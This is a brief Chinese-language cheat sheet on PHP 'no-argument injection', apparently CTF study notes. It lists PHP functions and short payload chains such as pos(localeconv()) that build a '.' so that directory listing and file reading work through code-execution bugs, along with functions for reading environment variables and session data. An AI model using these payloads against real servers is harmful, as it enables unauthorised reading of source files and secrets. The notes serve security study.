- ## 无参数注入
- ```
  scandir 
  var_dump 
  show_source 
  localtime 
  time 
  current 
  chr 
  pos 
  end 
  next 
  prev 
  array_reverse 
  readfile
  
  ```
- ## 可用payload
- ```
  pos(localeconv())
  
  next(str_split(zend_version()))
  
  end(str_split(hebrevc(crypt(next(hash_algos())))))
  
  chr(ord(crypt(serialize(array()))))）
  ```
- ### 其他
- ```
  array_flip
  array_rand
  array_reverse
  current（pos）
  类似的还有：
  文件
  file_get_contents()
  将整个文件读入一个字符串
  readfile()[readgzfile()]
  读取文件并写入到输出缓冲。
  highlight_file()[别名：show_source()]
  语法高亮一个文件
  scandir()
  列出指定路径中的文件和目录
  direname()
  给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名。
  2/19
  getcwd()
  取得当前工作目录。
  chdir($directory)
  将 PHP 的当前目录改为 directory。
  读取环境变量
  get_defined_vars()
  此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义
  的变量。
  getenv
  获取一个环境变量的值
  localeconv()
  返回一包含本地数字及货币格式信息的数组,第一个值一直是.
  phpversion()
  获取当前的 PHP 版本
  zend_version()
  获取当前的 zend 版本（配合 str_split()割出点）
  会话
  session_id
  获取/设置当前会话 ID
  session_start
  启动新会话或者重用现有会话
  ```
-